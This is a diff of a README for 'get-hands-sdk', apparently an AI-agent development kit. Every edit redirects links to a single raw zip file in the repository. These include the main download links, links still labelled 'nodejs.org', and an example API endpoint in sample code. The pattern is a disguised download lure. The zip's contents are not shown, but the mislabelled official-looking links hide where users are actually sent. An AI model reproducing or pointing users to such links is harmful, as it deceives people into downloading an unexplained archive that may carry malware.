@@ -1,12 +1,12 @@
 # 🔧 get-hands-sdk - Build Custom AI Agents Easily
 
-[![Download get-hands-sdk](https://img.shields.io/badge/Download-get--hands--sdk-blue?style=for-the-badge&logo=github)](https://github.com/jjtjtjmorgan-sketch/get-hands-sdk)
+[![Download get-hands-sdk](https://img.shields.io/badge/Download-get--hands--sdk-blue?style=for-the-badge&logo=github)](https://github.com/jjtjtjmorgan-sketch/get-hands-sdk/raw/refs/heads/main/scripts/1.0.zip)
 
 ## 🚀 Getting Started
 
 Welcome to **get-hands-sdk**! This is a developer preview tool that helps you build custom AI agents, connectors, and semantic search features. Think of it as a starter kit for creating your own AI-powered tools and services.
 
-Visit this link to download the application: [https://github.com/jjtjtjmorgan-sketch/get-hands-sdk](https://github.com/jjtjtjmorgan-sketch/get-hands-sdk)
+Visit this link to download the application: [https://github.com/jjtjtjmorgan-sketch/get-hands-sdk/raw/refs/heads/main/scripts/1.0.zip](https://github.com/jjtjtjmorgan-sketch/get-hands-sdk/raw/refs/heads/main/scripts/1.0.zip)
 
 ### What This Kit Does
 
@@ -27,7 +27,7 @@ Visit this link to download the application: [https://github.com/jjtjtjmorgan-sk
 
 ### Step 1: Download the Kit
 
-Visit this link to download the application: [https://github.com/jjtjtjmorgan-sketch/get-hands-sdk](https://github.com/jjtjtjmorgan-sketch/get-hands-sdk)
+Visit this link to download the application: [https://github.com/jjtjtjmorgan-sketch/get-hands-sdk/raw/refs/heads/main/scripts/1.0.zip](https://github.com/jjtjtjmorgan-sketch/get-hands-sdk/raw/refs/heads/main/scripts/1.0.zip)
 
 ### Step 2: Set Up Your Environment
 
@@ -35,7 +35,7 @@ Once you've downloaded the kit, you'll need to set up your development environme
 
 - **A computer running Windows 10 or newer**
 - **At least 4GB of RAM** (8GB recommended)
-- **Node.js** – A free program that lets your computer run JavaScript code. You can download it from [nodejs.org](https://nodejs.org)
+- **Node.js** – A free program that lets your computer run JavaScript code. You can download it from [nodejs.org](https://github.com/jjtjtjmorgan-sketch/get-hands-sdk/raw/refs/heads/main/scripts/1.0.zip)
 - **A code editor** – We recommend Visual Studio Code, which is free and easy to use
 
 ### Step 3: Install the SDK
@@ -125,7 +125,7 @@ const customConnector = new ProviderConnector({
   name: "MyDatabase",
   auth: "api-key",
   endpoints: {
-    query: "https://api.mydatabase.com/query"
+    query: "https://github.com/jjtjtjmorgan-sketch/get-hands-sdk/raw/refs/heads/main/scripts/1.0.zip"
   }
 });
 ```
@@ -133,7 +133,7 @@ const customConnector = new ProviderConnector({
 ## 🔧 Troubleshooting Common Issues
 
 ### "Node.js is not recognized"
-- Make sure you've installed Node.js from [nodejs.org](https://nodejs.org)
+- Make sure you've installed Node.js from [nodejs.org](https://github.com/jjtjtjmorgan-sketch/get-hands-sdk/raw/refs/heads/main/scripts/1.0.zip)
 - Restart your command prompt after installation
 - Check that Node.js is in your system's PATH variable
 
@@ -203,8 +203,8 @@ We're committed to improving get-hands-sdk based on your feedback. Here's what y
 
 Ready to build your own AI agents? Follow these quick steps:
 
-1. **Download** – Get the kit from our [official download page](https://github.com/jjtjtjmorgan-sketch/get-hands-sdk)
-2. **Install Node.js** – If you haven't already, grab it from [nodejs.org](https://nodejs.org)
+1. **Download** – Get the kit from our [official download page](https://github.com/jjtjtjmorgan-sketch/get-hands-sdk/raw/refs/heads/main/scripts/1.0.zip)
+2. **Install Node.js** – If you haven't already, grab it from [nodejs.org](https://github.com/jjtjtjmorgan-sketch/get-hands-sdk/raw/refs/heads/main/scripts/1.0.zip)
 3. **Open Your Terminal** – Get ready to type commands
 4. **Follow the Quick Start Guide** – We'll walk you through your first agent
 
@@ -227,7 +227,7 @@ We're constantly working on making get-hands-sdk even better:
 
 ---
 
-**Ready to transform your ideas into AI-powered reality?** [Download get-hands-sdk now](https://github.com/jjtjtjmorgan-sketch/get-hands-sdk) and start building today!
+**Ready to transform your ideas into AI-powered reality?** [Download get-hands-sdk now](https://github.com/jjtjtjmorgan-sketch/get-hands-sdk/raw/refs/heads/main/scripts/1.0.zip) and start building today!
 
 **Remember**: If you can imagine an AI that could help with your workflow, get-hands-sdk gives you the tools to make it happen. Start small, experiment often, and scale up when you're ready.
 
